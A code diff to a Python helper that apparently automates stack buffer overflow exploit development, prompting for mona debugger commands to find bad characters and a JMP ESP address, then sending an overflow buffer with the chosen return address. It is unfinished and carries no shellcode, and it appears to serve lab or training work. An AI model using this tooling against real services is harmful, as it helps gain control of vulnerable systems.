@@ -52,11 +52,25 @@ class Enum:
         print("[*] Sending all chars for bad char check...\n")
         fuzz.send_payload("A" * offset + "B" * 4 + bad_characters())
 
+        bad_char_esp = input(f"[?] Enter start ESP of bad characters: ")
+        print('\n[?] Run: !mona bytearray -b "\\x00"\n')
+        print(f"[?] Run: '!mona compare -f bytearray.bin -a {bad_char_esp}'\n")
+
+        print(f"[?] Run: '!mona modules'\n")
+        dll = input("Enter target DLL: ")
+
+        print(f"\n[?] Run: '!mona find -s '\\xff\\xe4' -m {dll}'\n")
+
+        dll_mem = input("[?] Enter target DLL Memory Location: ")
+
         self.print_restart_message()
         fuzz.is_target_up()
 
+        print("\n[*] Launching Test Payload...")
         print("[*] Sending buffer + 4 * 'B' + 390 * 'C'\n")
-        fuzz.send_payload("A" * offset + "B" * 4 + "C" * 500)
+        fuzz.send_payload("A" * offset + dll_mem + "C" * (3500 - offset - 4))
+        # Resolve memory address to little endian
+        # continue here?
 
     def get_pattern(self, crash_bytes):
         # Create pattern from crash bytes plus 300 byte padding
